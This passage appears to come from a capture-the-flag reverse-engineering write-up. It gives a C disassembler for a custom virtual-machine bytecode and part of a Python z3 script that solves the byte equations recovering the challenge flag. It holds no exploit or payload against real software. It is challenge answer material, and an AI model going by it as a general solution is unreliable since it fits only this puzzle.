x4F,0x2,0x6,0x5,0xDC,0x2,0x7,0x5,0x30,0x2,0x8,0x5,0xEB,0x2,0x9,0x5,0x8D,0x2,0xA,0x5,0x97,0x2,0xB,0x5,0xFE,0x2,0xC,0x5,0x28,0x2,0xD,0x5,0x40,0x2,0xE,0x5,0x4C,0x2,0xF,0x5,0x83,0x2,0x10,0x5,0x7F,0x1,0x15,0x1,0x42,0x1,0x26,0x1,0x1F,0x1,0x25,0x1,0x1A,0x1,0x5C,0x1,0x8,0x1,0x7E,0x1,0x5E,0x1,0x62,0x1,0x67,0x1,0x25,0x1,0x1C,0x1,0x1,0x1,0x69,0x3,0x1E,0x3,0x63,0x3,0x14,0x3,0x8,0x3,0x1D,0x3,0xA,0x3,0x63,0x3,0x40,0x3,0x4F,0x3,0x45,0x3,0x12,0x3,0x48,0x3,0x53,0x3,0x4C,0x3,0x2E,0x4,0x12,0x2,0x1,0x5,0x73,0x2,0x2,0x5,0xCC,0x2,0x3,0x5,0xA8,0x2,0x4,0x5,0xE1,0x2,0x5,0x5,0xE9,0x2,0x6,0x5,0xF2,0x2,0x7,0x5,0x8D,0x2,0x8,0x5,0x66,0x2,0x9,0x5,0x50,0x2,0xA,0x5,0xAF,0x2,0xB,0x5,0x20,0x2,0xC,0x5,0x75,0x2,0xD,0x5,0x1E,0x2,0xE,0x5,0xF,0x2,0xF,0x5,0xD5,0x2,0x10,0x5,0x5B,0x1,0x53,0x1,0x6B,0x1,0x68,0x1,0x17,0x1,0x6D,0x1,0x3F,0x1,0x68,0x1,0x4D,0x1,0x3,0x1,0x50,0x1,0x22,0x1,0x2B,0x1,0x22,0x1,0x64,0x1,0x5D,0x1,0x36,0x3,0x3A,0x3,0x25,0x3,0x5A,0x3,0x51,0x3,0x50,0x3,0x7D,0x3,0x6D,0x3,0x3,0x3,0xB,0x3,0x42,0x3,0x3B,0x3,0x35,0x3,0x3E,0x3,0x40,0x3,0x37,0x4,0x13,0x2,0x1,0x5,0x3C,0x2,0x2,0x5,0x23,0x2,0x3,0x5,0x3D,0x2,0x4,0x5,0xFF,0x2,0x5,0x5,0x85,0x2,0x6,0x5,0xD4,0x2,0x7,0x5,0x4B,0x2,0x8,0x5,0x6E,0x2,0x9,0x5,0x51,0x2,0xA,0x5,0x23,0x2,0xB,0x5,0x9F,0x2,0xC,0x5,0x6F,0x2,0xD,0x5,0x92,0x2,0xE,0x5,0xED,0x2,0xF,0x5,0xD7,0x2,0x10,0x5,0x8E,0x1,0x25,0x1,0x15,0x1,0x61,0x1,0x19,0x1,0x2E,0x1,0x5D,0x1,0x58,0x1,0x24,0x1,0xD,0x1,0x61,0x1,0x8,0x1,0x42,0x1,0x7C,0x1,0x44,0x1,0x3B,0x1,0x36,0x3,0x78,0x3,0x33,0x3,0x7D,0x3,0x4,0x3,0x23,0x3,0x1A,0x3,0x1B,0x3,0x58,0x3,0x72,0x3,0x43,0x3,0x7C,0x3,0x3E,0x3,0x67,0x3,0x50,0x3,0x4F,0x4,0x14,0x2,0x1,0x5,0xB3,0x2,0x2,0x5,0x44,0x2,0x3,0x5,0xAA,0x2,0x4,0x5,0xD7,0x2,0x5,0x5,0xFF,0x2,0x6,0x5,0x30,0x2,0x7,0x5,0xFA,0x2,0x8,0x5,0x3A,0x2,0x9,0x5,0x4D,0x2,0xA,0x5,0x27,0x2,0xB,0x5,0x31,0x2,0xC,0x5,0x16,0x2,0xD,0x5,0x53,0x2,0xE,0x5,0x5D,0x2,0xF,0x5,0x49,0x2,0x10,0x5,0x60,0x1,0x43,0x1,0x29,0x1,0x77,0x1,0x16,0x1,0x20,0x1,0x25,0x1,0x58,0x1,0x6F,0x1,0x4E,0x1,0x3C,0x1,0x9,0x1,0x46,0x1,0x79,0x1,0x4B,0x1,0x1F,0x1,0x0,0x3,0x4B,0x3,0xE,0x3,0x69,0x3,0x64,0x3,0x6B,0x3,0x67,0x3,0x2,0x3,0x52,0x3,0x66,0x3,0x1E,0x3,0x35,0x3,0x2C,0x3,0x3,0x3,0x7,0x3,0x41,0x4,0x15,0x2,0x1,0x5,0x82,0x2,0x2,0x5,0x2F,0x2,0x3,0x5,0xC3,0x2,0x4,0x5,0x5D,0x2,0x5,0x5,0xC0,0x2,0x6,0x5,0xB2,0x2,0x7,0x5,0xC,0x2,0x8,0x5,0x2B,0x2,0x9,0x5,0x97,0x2,0xA,0x5,0x1D,0x2,0xB,0x5,0x1D,0x2,0xC,0x5,0x37,0x2,0xD,0x5,0x56,0x2,0xE,0x5,0x4C,0x2,0xF,0x5,0xA1,0x2,0x10,0x5,0x37,0x1,0x6,0x1,0x2A,0x1,0xA,0x1,0x16,0x1,0x5,0x1,0x4C,0x1,0x28,0x1,0x10,0x1,0x59,0x1,0x58,0x1,0x2E,0x1,0x3B,0x1,0x7D,0x1,0x5A,0x1,0x64,0x1,0x64,0x3,0x13,0x3,0x5E,0x3,0x2,0x3,0x43,0x3,0x36,0x3,0x5E,0x3,0x78,0x3,0x4D,0x3,0x1B,0x3,0x63,0x3,0x2C,0x3,0x37,0x3,0x6F,0x3,0x4B,0x3,0x40,0x4,0x16,0x2,0x1,0x5,0x80,0x2,0x2,0x5,0x6B,0x2,0x3,0x5,0x6B,0x2,0x4,0x5,0x70,0x2,0x5,0x5,0xD6,0x2,0x6,0x5,0x33,0x2,0x7,0x5,0x24,0x2,0x8,0x5,0x84,0x2,0x9,0x5,0xCF,0x2,0xA,0x5,0xD5,0x2,0xB,0x5,0x19,0x2,0xC,0x5,0xA6,0x2,0xD,0x5,0xFE,0x2,0xE,0x5,0xCE,0x2,0xF,0x5,0xF8,0x2,0x10,0x5,0x62,0x1,0x23,0x1,0x57,0x1,0x65,0x1,0x56,0x1,0x31,0x1,0x24,0x1,0x1F,0x1,0x65,0x1,0x5E,0x1,0x2B,0x1,0x51,0x1,0x62,0x1,0xE,0x1,0x34,0x1,0x3E,0x1,0x57,0x3,0x5,0x3,0x56,0x3,0x34,0x3,0x38,0x3,0x3B,0x3,0x31,0x3,0x5E,0x3,0x16,0x3,0x76,0x3,0x7C,0x3,0x25,0x3,0x1A,0x3,0x5F,0x3,0x14,0x3,0x5D,0x4,0x17,0x2,0x1,0x5,0x15,0x2,0x2,0x5,0x48,0x2,0x3,0x5,0x81,0x2,0x4,0x5,0xE4,0x2,0x5,0x5,0xC0,0x2,0x6,0x5,0xBE,0x2,0x7,0x5,0x6D,0x2,0x8,0x5,0xCB,0x2,0x9,0x5,0x13,0x2,0xA,0x5,0x23,0x2,0xB,0x5,0x38,0x2,0xC,0x5,0xCA,0x2,0xD,0x5,0xF9,0x2,0xE,0x5,0x5F,0x2,0xF,0x5,0xB0,0x2,0x10,0x5,0x9F,0x1,0x4F,0x1,0x20,0x1,0x2D,0x1,0x2,0x1,0x46,0x1,0x3D,0x1,0x1A,0x1,0x2A,0x1,0x66,0x1,0x39,0x1,0x61,0x1,0x77,0x1,0x3F,0x1,0x5E,0x1,0xE,0x1,0x70,0x3,0x55,0x3,0x20,0x3,0x40,0x3,0x7F,0x3,0x2F,0x3,0x24,0x3,0x14,0x3,0x60,0x3,0x5C,0x3,0x5C,0x3,0x17,0x3,0x12,0x3,0x8,0x3,0x2E,0x3,0x2D,0x4,0x18,0x2,0x1,0x5,0x27,0x2,0x2,0x5,0x42,0x2,0x3,0x5,0xDA,0x2,0x4,0x5,0x73,0x2,0x5,0x5,0xA8,0x2,0x6,0x5,0x19,0x2,0x7,0x5,0x20,0x2,0x8,0x5,0x89,0x2,0x9,0x5,0x49,0x2,0xA,0x5,0xB9,0x2,0xB,0x5,0x50,0x2,0xC,0x5,0xD5,0x2,0xD,0x5,0x45,0x2,0xE,0x5,0x44,0x2,0xF,0x5,0x3B,0x2,0x10,0x5,0x10,0x1,0x3D,0x1,0x74,0x1,0x59,0x1,0x65,0x1,0x6D,0x1,0x4D,0x1,0x40,0x1,0x23,0x1,0x5B,0x1,0x70,0x1,0x30,0x1,0x15,0x1,0x52,0x1,0xD,0x1,0x6E,0x1,0x44,0x3,0x67,0x3,0x7,0x3,0x45,0x3,0x3B,0x3,0xB,0x3,0x7F,0x3,0x4A,0x3,0x22,0x3,0xA,0x3,0x5E,0x3,0x39,0x3,0x24,0x3,0x54,0x3,0x4,0x3,0x23,0x4,0x19,0x2,0x1,0x5,0xC,0x2,0x2,0x5,0xC5,0x2,0x3,0x5,0xD6,0x2,0x4,0x5,0xF9,0x2,0x5,0x5,0xD7,0x2,0x6,0x5,0xA5,0x2,0x7,0x5,0xAB,0x2,0x8,0x5,0xB0,0x2,0x9,0x5,0x4F,0x2,0xA,0x5,0x41,0x2,0xB,0x5,0xFB,0x2,0xC,0x5,0x10,0x2,0xD,0x5,0x8E,0x2,0xE,0x5,0x70,0x2,0xF,0x5,0x6,0x2,0x10,0x5,0x11,0x1,0x1F,0x1,0x3C,0x1,0x45,0x1,0x4F,0x1,0x55,0x1,0x44,0x1,0x48,0x1,0x6D,0x1,0x13,0x1,0x30,0x1,0x43,0x1,0x6A,0x1,0x3B,0x1,0x1E,0x1,0x4D,0x1,0x4,0x3,0xF,0x3,0x34,0x3,0x1C,0x3,0x5B,0x3,0x70,0x3,0x49,0x3,0x15,0x3,0x71,0x3,0x57,0x3,0x5B,0x3,0x0,0x3,0x71,0x3,0x31,0x3,0x35,0x3,0x5C,0x4,0x1A,0x2,0x1,0x5,0xCD,0x2,0x2,0x5,0xFB,0x2,0x3,0x5,0xBD,0x2,0x4,0x5,0x46,0x2,0x5,0x5,0xFE,0x2,0x6,0x5,0x8C,0x2,0x7,0x5,0xB5,0x2,0x8,0x5,0xD5,0x2,0x9,0x5,0xFC,0x2,0xA,0x5,0x70,0x2,0xB,0x5,0x6A,0x2,0xC,0x5,0xF3,0x2,0xD,0x5,0x42,0x2,0xE,0x5,0xC1,0x2,0xF,0x5,0x93,0x2,0x10,0x5,0xB4,0x1,0x3F,0x1,0xA,0x1,0x6B,0x1,0x1A,0x1,0x5A,0x1,0x16,0x1,0x7B,0x1,0x62,0x1,0xA,0x1,0x2F,0x1,0x2B,0x1,0x5B,0x1,0x34,0x1,0x4E,0x1,0x2B,0x1,0x38,0x3,0x5B,0x3,0x5C,0x3,0x9,0x3,0x8,0x3,0x3C,0x3,0x62,0x3,0x1E,0x3,0x6A,0x3,0x1F,0x3,0x21,0x3,0x3A,0x3,0x36,0x3,0x12,0x3,0x5E,0x3,0xF,0x4,0x1B,0x2,0x1,0x5,0x95,0x2,0x2,0x5,0xCD,0x2,0x3,0x5,0x50,0x2,0x4,0x5,0xC0,0x2,0x5,0x5,0xAE,0x2,0x6,0x5,0x6E,0x2,0x7,0x5,0xA0,0x2,0x8,0x5,0x79,0x2,0x9,0x5,0x67,0x2,0xA,0x5,0x4E,0x2,0xB,0x5,0xAE,0x2,0xC,0x5,0x5A,0x2,0xD,0x5,0xCD,0x2,0xE,0x5,0x63,0x2,0xF,0x5,0x2,0x2,0x10,0x5,0xAE,0x1,0x3F,0x1,0x13,0x1,0x6,0x1,0x2C,0x1,0x4D,0x1,0x45,0x1,0x58,0x1,0x8,0x1,0x61,0x1,0x77,0x1,0x39,0x1,0x2C,0x1,0x60,0x1,0x32,0x1,0x38,0x1,0xB,0x3,0xE,0x3,0x16,0x3,0x7,0x3,0x28,0x3,0x3E,0x3,0x6,0x3,0x6B,0x3,0x50,0x3,0x1C,0x3,0x16,0x3,0x44,0x3,0x4B,0x3,0x2E,0x3,0x7F,0x3,0x47,0x4,0x1C,0x2,0x1,0x5,0x4F,0x2,0x2,0x5,0x90,0x2,0x3,0x5,0xA1,0x2,0x4,0x5,0xF3,0x2,0x5,0x5,0x8C,0x2,0x6,0x5,0x37,0x2,0x7,0x5,0x95,0x2,0x8,0x5,0x12,0x2,0x9,0x5,0x3C,0x2,0xA,0x5,0xC9,0x2,0xB,0x5,0x95,0x2,0xC,0x5,0xD8,0x2,0xD,0x5,0x2,0x2,0xE,0x5,0xE2,0x2,0xF,0x5,0x31,0x2,0x10,0x5,0x51,0x1,0x12,0x1,0x63,0x1,0x5F,0x1,0x4E,0x1,0x6E,0x1,0x3A,0x1,0x46,0x1,0x8,0x1,0x39,0x1,0x25,0x1,0x4E,0x1,0xD,0x1,0x5C,0x1,0x70,0x1,0x3,0x1,0x1,0x3,0x40,0x3,0x74,0x3,0x7D,0x3,0x38,0x3,0x1F,0x3,0x4B,0x3,0x5A,0x3,0x7E,0x3,0x3D,0x3,0x68,0x3,0x43,0x3,0x77,0x3,0x47,0x3,0x6C,0x3,0x4,0x4,0x1D,0x2,0x1,0x5,0x72,0x2,0x2,0x5,0xBC,0x2,0x3,0x5,0x8B,0x2,0x4,0x5,0x5,0x2,0x5,0x5,0x3C,0x2,0x6,0x5,0xEE,0x2,0x7,0x5,0x7,0x2,0x8,0x5,0x72,0x2,0x9,0x5,0xCA,0x2,0xA,0x5,0x2C,0x2,0xB,0x5,0x4B,0x2,0xC,0x5,0x76,0x2,0xD,0x5,0x82,0x2,0xE,0x5,0x64,0x2,0xF,0x5,0x8,0x2,0x10,0x5,0x5B,0x1,0x57,0x1,0x22,0x1,0x6A,0x1,0x79,0x1,0x34,0x1,0x2A,0x1,0x54,0x1,0x21,0x1,0x17,0x1,0x63,0x1,0x3,0x1,0x73,0x1,0x16,0x1,0x49,0x1,0xE,0x1,0x70,0x3,0x6A,0x3,0x71,0x3,0x2A,0x3,0x6A,0x3,0x72,0x3,0xA,0x3,0x5B,0x3,0x15,0x3,0x27,0x3,0x18,0x3,0x1E,0x3,0x17,0x3,0x66,0x3,0x22,0x3,0x74,0x4,0x1E,0x2,0x1,0x5,0x12,0x2,0x2,0x5,0x5B,0x2,0x3,0x5,0x99,0x2,0x4,0x5,0xBE,0x2,0x5,0x5,0x2C,0x2,0x6,0x5,0xDF,0x2,0x7,0x5,0x92,0x2,0x8,0x5,0xC1,0x2,0x9,0x5,0xFA,0x2,0xA,0x5,0x18,0x2,0xB,0x5,0x19,0x2,0xC,0x5,0x33,0x2,0xD,0x5,0x9E,0x2,0xE,0x5,0x66,0x2,0xF,0x5,0x7A,0x2,0x10,0x5,0xA4,0x1,0x10,0x1,0xF,0x1,0x6D,0x1,0x39,0x1,0x47,0x1,0x13,0x1,0x5,0x1,0x7D,0x1,0x1A,0x1,0x46,0x1,0x44,0x1,0x68,0x1,0x3B,0x1,0x2,0x1,0x17,0x1,0x56,0x3,0x41,0x3,0x62,0x3,0x5D,0x3,0x4,0x3,0x71,0x3,0x48,0x3,0x24,0x3,0x52,0x3,0x35,0x3,0x3F,0x3,0x76,0x3,0xE,0x3,0x52,0x3,0x42,0x3,0x1F,0x4,0x1F,0x2,0x1,0x5,0xD3,0x2,0x2,0x5,0xCD,0x2,0x3,0x5,0x22,0x2,0x4,0x5,0x34,0x2,0x5,0x5,0xE3,0x2,0x6,0x5,0x51,0x2,0x7,0x5,0x4C,0x2,0x8,0x5,0x46,0x2,0x9,0x5,0x93,0x2,0xA,0x5,0xCB,0x2,0xB,0x5,0x42,0x2,0xC,0x5,0xB0,0x2,0xD,0x5,0xBE,0x2,0xE,0x5,0xC7,0x2,0xF,0x5,0x22,0x2,0x10,0x5,0x30,0x1,0x67,0x1,0x45,0x1,0x61,0x1,0x68,0x1,0x64,0x1,0x43,0x1,0x6C,0x1,0x60,0x1,0x6D,0x1,0x57,0x1,0x3,0x1,0x58,0x1,0x12,0x1,0x25,0x1,0x2B,0x1,0x6E,0x3,0x2B,0x3,0x55,0x3,0x5A,0x3,0x36,0x3,0x54,0x3,0x7A,0x3,0x34,0x3,0x22,0x3,0x18,0x3,0x43,0x3,0x4B,0x3,0x63,0x3,0x13,0x3,0x5F,0x3,0x2D,0x4,0x20,0x2,0x11,0x2,0x12,0x2,0x13,0x2,0x14,0x2,0x15,0x2,0x16,0x2,0x17,0x2,0x18,0x2,0x19,0x2,0x1A,0x2,0x1B,0x2,0x1C,0x2,0x1D,0x2,0x1E,0x2,0x1F,0x2,0x20,0x0 };

    int n = 0;
    while(s1[n]!=0){
        switch (s1[n]) {
        case 1:
            printf("pop atpop btpush a*bn");
            break;
        case 2:
            printf("push s2[%d]n", s1[n + 1]);
            break;
        case 3:
            printf("pop atpop btpush a+bn");
            break;
        case 4:
            printf("pop cts2[%d]=cn", s1[n + 1]);
            break;
        case 5:
            printf("push %Xhn", s1[n + 1]);
        }
        n += 2;
    }

    /*printf("nnn");

    n = 0;
    while (s1[n] != 0) {
        switch (s1[n]) {
        case 2:
            printf("a[%d]*", s1[n + 1] - 1);
            break;
        case 5:
            printf("%d+", s1[n + 1]);
            break;
        default:
            break;
        }
        n += 2;
        
    }*/
    
    return 0;
}
```



```
import z3

length=64

a=[z3.BitVec('a{}'.format(i),8) for i in range(length)]

x=z3.Solver()
    
for i in range(length):
    x.add(a[i]>=32)
    x.add(a[i]<127)

s1=[0x2E, 0x32, 0x16, 0x21, 0x8D, 0x82, 0x3D, 0x5F, 0x22, 0xF5, 0xBE, 0x99, 0x5F, 0x29, 0x0A, 0x3A,0x14, 0x97, 0x90, 0xFD, 0x39, 0x20, 0x30, 0x13, 0x54, 0x83, 0x29, 0x68, 0xC9, 0x88, 0x00, 0x5C,0x5B, 0x63, 0x57, 0x2B, 0xEE, 0x6A, 0xC7, 0x34, 0x26, 0x0F, 0x1A, 0xCC, 0xA0, 0x30, 0xE4, 0xE9,0x69, 0x84, 0x94, 0xA4, 0x53, 0x0F, 0x39, 0x8A, 0xB4, 0x73, 0x37, 0xBC, 0x43, 0xD8, 0x72, 0x4C]

x.add((a[0]*170+a[1]*237+a[2]*236+a[3]*93+a[4]*142+a[5]*135+a[6]*65+a[7]*255+a[8]*166+a[9]*166+a[10]*16+a[11]*91+a[12]*198+a[13]*1+a[14]*122+a[15]*253)&0xff==s1[0])
x.add((a[0]*61+a[1]*113+a[2]*174+a[3]*90+a[4]*79+a[5]*220+a[6]*48+a[7]*235+a[8]*141+a[9]*151+a[10]*254+a[11]*40+a[12]*64+a[13]*76+a[14]*131+a[15]*127)&0xff==s1[1])
x.add((a[0]*115+a[1]*204+a[2]*168+a[3]*225+a[4]*233+a[5]*242+a[6]*141+a[7]*102+a[8]*80+a[9]*175+a[10]*32+a[11]*117+a[12]*30+a[13]*15+a[14]*213+a[15]*91)&0xff==s1[2])
x.add((a[0]*60+a[1]*35+a[2]*61+a[3]*255+a[4]*133+a[5]*212+a[6]*75+a[7]*110+a[8]*81+a[9]*35+a[10]*159+a[11]*111+a[12]*146+a[13]*237+a[14]*215+a[15]*142)&0xff==s1[3])
x.add((a[0]*179+a[1]*68+a[2]*170+a[3]*215+a[4]*255+a[5]*48+a[6]*250+a[7]*58+a[8]*77+a[9]*39+a[10]*49+a[11]*22+a[12]*83+a[13]*93+a[14]*73+a[15]*96)&0xff==s1[4])
x.add((a[0]*130+a[1]*47+a[2]*195+a[3]*93+a[4]*192+a[5]*178+a[6]*12+a[7]*43+a[8]*151+a[9]*29+a[10]*29+a[11]*55+a[12]*86+a[13]*76+a[14]*161+a[15]*55)&0xff==s1[5])
x.add((a[0]*128+a[1]*107+a[2]*107+a[3]*112+a[4]*214+a[5]*51+a[6]*36+a[7]*132+a[8]*207+a[9]*213+a[10]*25+a[11]*166+a[12]*254+a[13]*206+a[14]*248+a[15]*98)&0xff==s1[6])
x.add((a[0]*21+a[1]*72+a[2]*129+a[3]*228+a[4]*192+a[5]*190+a[6]*109+a[7]*203+a[8]*19+a[9]*35+a[10]*56+a[11]*202+a[12]*249+a[13]*95+a[14]*176+a[15]*159)&0xff==s1[7])
x.add((a[0]*39+a[1]*66+a[2]*218+a[3]*115+a[4]*168+a[5]*25+a[6]*32+a[7]*137+a[8]*73+a[9]*185+a[10]*80+a[11]*213+a[12]*69+a[13]*68+a[14]*59+a[15]*16)&0xff==s1[8])
x.add((a[0]*12+a[1]*197+a[2]*214+a[3]*249+a[4]*215+a[5]*165+a[6]*171+a[7]*176+a[8]*79+a[9]*65+a[10]*251+a[11]*16+a[12]*142+a[13]*112+a[14]*6+a[15]*17)&0xff==s1[9])
x.add((a[0]*205+a[1]*251+a[2]*189+a[3]*70+a[4]*254+a[5]*140+a[6]*181+a[7]*213+a[8]*252+a[9]*112+a[10]*106+a[11]*243+a[12]*66+a[13]*193+a[14]*147+a[15]*180)&0xff==s1[10])
x.add((a[0]*149+a[1]*205+a[2]*80+a[3]*192+a[4]*174+a[5]*110+a[6]*160+a[7]*121+a[8]*103+a[9]*78+a[10]*174+a[11]*90+a[12]*205+a[13]*99+a[14]*2+a[15]*174)&0xff==s1[11])
x.add((a[0]*79+a[1]*144+a[2]*161+a[3]*243+a[4]*140+a[5]*55+a[6]*149+a[7]*18+a[8]*60+a[9]*201+a[10]*149+a[11]*216+a[12]*2+a[13]*226+a[14]*49+a[15]*81)&0xff==s1[12])
x.add((a[0]*114+a[1]*188+a[2]*139+a[3]*5+a[4]*60+a[5]*238+a[6]*7+a[7]*114+a[8]*202+a[9]*44+a[10]*75+a[11]*118+a[12]*130+a[13]*100+a[14]*8+a[15]*91)&0xff==s1[13])
x.add((a[0]*18+a[1]*91+a[2]*153+a[3]*190+a[4]*44+a[5]*223+a[6]*146+a[7]*193+a[8]*250+a[9]*24+a[10]*25+a[11]*51+a[12]*158+a[13]*102+a[14]*122+a[15]*164)&0xff==s1[14])
x.add((a[0]*211+a[1]*205+a[2]*34+a[3]*52+a[4]*227+a[5]*81+a[6]*76+a[7]*70+a[8]*147+a[9]*203+a[10]*66+a[11]*176+a[12]*190+a[13]*199+a[14]*34+a[15]*48)&0xff==s1[15])

x.add((a[0+16]*170+a[1+16]*237+a[2+16]*236+a[3+16]*93+a[4+16]*142+a[5+16]*135+a[6+16]*65+a[7+16]*255+a[8+16]*166+a[9+16]*166+a[10+16]*16+a[11+16]*91+a[12+16]*198+a[13+16]*1+a[14+16]*122+a[15+16]*253)&0xff==s1[0+16])
x.add((a[0+16]*61+a[1+16]*113+a[2+16]*174+a[3+16]*90+a[4+16]*79+a[5+16]*220+a[6+16]*48+a[7+16]*235+a[8+16]*141+a[9+16]*151+a[10+16]*254+a[11+16]*40+a[12+16]*64+a[13+16]*76+a[14+16]*131+a[15+16]*127)&0xff==s1[1+16])
x.add((a[0+16]*115+a[1+16]*204+a[2+16]*168+a[3+16]*225+a[4+16]*233+a[5+16]*242+a[6+16]*141+a[7+16]*102+a[8+16]*80+a[9+16]*175+a[10+16]*32+a[11+16]*117+a[12+16]*30+a[13+16]*15+a[14+16]*213+a[15+16]*91)&0xff==s1[2+16])
x.add((a[0+16]*60+a[1+16]*35+a[2+16]*61+a[3+16]*255+a[4+16]*133+a[5+16]*212+a[6+16]*75+a[7+16]*110+a[8+16]*81+a[9+16]*35+a[10+16]*159+a[11+16]*111+a[12+16]*146+a[13+16]*237+a[14+16]*215+a[15+16]*142)&0xff==s1[3+16])
x.add((a[0+16]*179+a[1+16]*68+a[2+16]*170+a[3+16]*215+a[4+16]*255+a[5+16]*48+a[6+16]*250+a[7+16]*58+a[8+16]*77+a[9+16]*39+a[10+16]*49+a[11+16]*22+a[12+16]*83+a[13+16]*93+a[14+16]*73+a[15+16]*96)&0xff==s1[4+16])
x.add((a[0+16]*130+a[1+16]*47+a[2+16]*195+a[3+16]*93+a[4+16]*192+a[5+16]*178+a[6+16]*12+a[7+16]*43+a[8+16]*151+a[9+16]*29+a[10+16]*29+a[11+16]*55+a[12+16]*86+a[13+16]*76+a[14+16]*161+a[15+16]*55)&0xff==s1[5+16])
x.add((a[0+16]*128+a[1+16]*107+a[2+16]*107+a[3+16]*112+a[4+16]*214+a[5+16]*51+a[6+16]*36+a[7+16]*132+a[8+16]*207+a[9+16]*213+a[10+16]*25+a[11+16]*166+a[12+16]*254+a[13+16]*206+a[14+16]*248+a[15+16]*98)&0xff==s1[6+16])
x.add((a[0+16]*21+a[1+16]*72+a[2+16]*129+a[3+16]*228+a[4+16]*192+a[5+16]*190+a[6+16]*109+a[7+16]*203+a[8+16]*19+a[9+16]*35+a[10+16]*56+a[11+16]*202+a[12+16]*249+a[13+16]*95+a[14+16]*176+a[15+16]*159)&0xff==s1[7+16])
x.add((a[0+16]*39+a[1+16]*66+a[2+16]*218+a[3+16]*115+a[4+16]*168+a[5+16]*25+a[6+16]*32+a[7+16]*137+a[8+16]*73+a[9+16]*185+a[10+16]*80+a[11+16]*213+a[12+16]*69+a[13+16]*68+a[14+16]*59+a[15+16]*16)&0xff==s1[8+16])
x.add((a[0+16]*12+a[1+16]*197+a[2+16]*214+a[3+16]*249+a[4+16]*215+a[5+16]*165+a[6+16]*171+a[7+16]*176+a[8+16]*79+a[9+16]*65+a[10+16]*251+a[11+16]*16+a[12+16]*142+a[13+16]*112+a[14+16]*6+a[15+16]*17)&0xff==s1[9+16])
x.add((a[0+16]*205+a[1+16]*251+a[2+16]*189+a[3+16]*70+a[4+16]*254+a[5+16]*140+a[6+16]*181+a[7+16]*213+a[8+16]*252+a[9+16]*112+a[10+16]*106+a[11+16]*243+a[12+16]*66+a[13+16]*193+a[14+16]*147+a[15+16]*180)&0xff==s1[10+16])
x.add((a[0+16]*149+a[1+16]*205+a[2+16]*80+a[3+16]*192+a[4+16]*174+a[5+16]*110+a[6+16]*160+a[7+16]*121+a[8+16]*103+a[9+16]*78+a[10+16]*174+a[11+16]*90+a[12+16]*205+a[13+16]*99+a[14+16]*2+a[15+16]*174)&0xff==s1[11+16])
x.add((a[0+16]*79+a[1+16]*144+a[2+16]*161+a[3+16]*243+a[4+16]*140+a[5+16]*55+a[6+16]*149+a[7+16]*18+a[8+16]*60+a[9+16]*201+a[10+16]*149+a[11+16]*216+a[12+16]*2+a[13+16]*226+a[14+16]*49+a[15+16]*81)&0xff==s1[12+16])
x.add((a[0+16]*114+a[1+16]*188+a[2+16]*139+a[3+16]*5+a[4+16]*60+a[5+16]*238+a[6+16]*7+a[7+16]*114+a[8+16]*202+a[9+16]*44+a[10+16]*75+a[11+16]*118+a[12+16]*130+a[13+16]*100+a[14+16]*8+a[15+16]*91)&0xff==s1[13+16])
x.add((a[0+16]*18+a[1+16]*91+a[2+16]*153+a[3+16]*190+a[4+16]*44+a[5+16]*223+a[6+16]*146+a[7+16]*193+a[8+16]*250+a[9+16]*24+a[10+16]*25+a[11+16]*51+a[12+16]*158+a[13+16]*102+a[14+16]*122+a[15+16]*164)&0xff==s1[14+16])
x.add((a[0+16]*211+a[1+16]*205+a[2+16]*34+a[3+16]*52+a[4+16]*227+a[5+16]*81+a[6+16]*76+a[7+16]*70+a[8+16]*147+a[9+16]*203+a[10+16]*66+a[11+16]*176+a[12+16]*190+a[13+16]*199+a[14+16]*34+a[15+16]*48)&0xff==s1[15+16])

x.add((a[0+32]*170+a[1+32]*237+a[2+32]*236+a[3+32]*93+a[4+32]*142+a[5+32]*135+a[6+32]*65+a[7+32]*255+a[8+32]*166+a[9+32]*166+a[10+32]*16+a[11+32]*91+a[12+32]*198+a[13+32]*1+a[14+32]*122+a[15+32]*253)&0xff==s1[0+32])
x.add((a[0+32]*61+a[1+32]*113+a[2+32]*174+a[3+32]*90+a[4+32]*79+a[5+32]*220+a[6+32]*48+a[7+32]*235+a[8+32]*141+a[9+32]*151+a[10+32]*254+a[11+32]*40+a[12+32]*64+a[13+32]*76+a[14+32]*131+a[15+32]*127)&0xff==s1[1+32])
x.add((a[0+32]*115+a[1+32]*204+a[2+32]*168+a[3+32]*225+a[4+32]*233+a[5+32]*242+a[6+32]*141+a[7+32]*102+a[8+32]*80+a[9+32]*175+a[10+32]*32+a[11+32]*117+a[12+32]*30+a[13+32]*15+a[14+32]*213+a[15+32]*91)&0xff==s1[2+32])
x.add((a[0+32]*60+a[1+32]*35+a[2+32]*61+a[3+32]*255+a[4+32]*133+a[5+32]*212+a[6+32]*75+a[7+32]*110+a[8+32]*81+a[9+32]*35+a[10+32]*159+a[11+32]*111+a[12+32]*146+a[13+32]*237+a[14+32]*215+a[15+32]*142)&0xff==s1[3+32])
x.add((a[0+32]*179+a[1+32]*68+a[2+32]*170+a[3+32]*215+a[4+32]*255+a[5+32]*48+a[6+32]*250+a[7+32]*58+a[8+32]*77+a[9+32]*39+a[10+32]*49+a[11+32]*22+a[12+32]*83+a[13+32]*93+a[14+32]*73+a[15+32]*96)&0xff==s1[4+32])
x.add((a[0+32]*130+a[1+32]*47+a[2+32]*195+a[3+32]*93+a[4+32]*192+a[5+32]*178+a[6+32]*12+a[7+32]*43+a[8+32]*151+a[9+32]*29+a[10+32]*29+a[11+32]*55+a[12+32]*86+a[13+32]*76+a[14+32]*161+a[15+32]*55)&0xff==s1[5+32])
x.add((a[0+32]*128+a[1+32]*107+a[2+32]*107+a[3+32]*112+a[4+32]*214+a[5+32]*51+a[6+32]*36+a[7+32]*132+a[8+32]*207+a[9+32]*213+a[10+32]*25+a[11+32]*166+a[12+32]*254+a[13+32]*206+a[14+32]*248+a[15+32]*98)&0xff==s1[6+32])
x.add((a[0+32]*21+a[1+32]*72+a[2+32]*129+a[3+32]*228+a[4+32]*192+a[5+32]*190+a[6+32]*109+a[7+32]*203+a[8+32]*19+a[9+32]*35+a[10+32]*56+a[11+32]*202+a[12+32]*249+a[13+32]*95+a[14+32]*176+a[15+32]*159)&0xff==s1[7+32])
x.add((a[0+32]*39+a[1+32]*66+a[2+32]*218+a[3+32]*115+a[4+32]*168+a[5+32]*25+a[6+32]*32+a[7+32]*137+a[8+32]*73+a[9+32]*185+a[10+32]*80+a[11+32]*213+a[12+32]*69+a[13+32]*68+a[14+32]*59+a[15+32]*16)&0xff==s1[8+32])
